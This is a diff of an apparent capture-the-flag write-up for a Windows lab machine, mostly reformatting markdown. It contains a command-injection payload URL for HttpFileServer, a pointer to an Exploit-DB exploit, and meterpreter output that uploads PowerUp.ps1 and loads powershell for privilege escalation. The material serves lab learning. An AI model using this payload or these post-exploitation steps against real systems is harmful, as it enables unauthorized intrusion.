@@ -153,8 +153,7 @@ http://localhost:80/?search=%00{.exec|cmd.exe /c <command>.}
 
 
 
-### EDB Note: This vulnerability will run the payload multiple times simultaneously.
-## Make sure to take this into consideration when crafting your payload (and/or listener).
+**Exploit-DB Note: This vulnerability will run the payload multiple times simultaneously.Make sure to take this into consideration when crafting your payload (and/or listener).**
 ```
 
 That file provides information to describe it but no exploit:  
@@ -164,14 +163,15 @@ https://www.exploit-db.com/exploits/39161 provides a usable exploit for this.
 ## Task 3 Privilege Escalation 
 
 To enumerate this machine, we will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities - "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."
-
+```
 meterpreter > upload /opt/PowerSploit/Privesc/PowerUp.ps1 
 [*] Uploading  : /opt/PowerSploit/Privesc/PowerUp.ps1 -> PowerUp.ps1
 [*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /opt/PowerSploit/Privesc/PowerUp.ps1 -> PowerUp.ps1
 [*] Completed  : /opt/PowerSploit/Privesc/PowerUp.ps1 -> PowerUp.ps1
 meterpreter >
+```
 
-## Q1: Gain powershell access from the meterpreter, its also possible via shell, then powershell
+### Q1: Gain powershell access from the meterpreter, its also possible via shell, then powershell
 Answer: just perform the following 2 commands
 ```
 meterpreter > load powershell
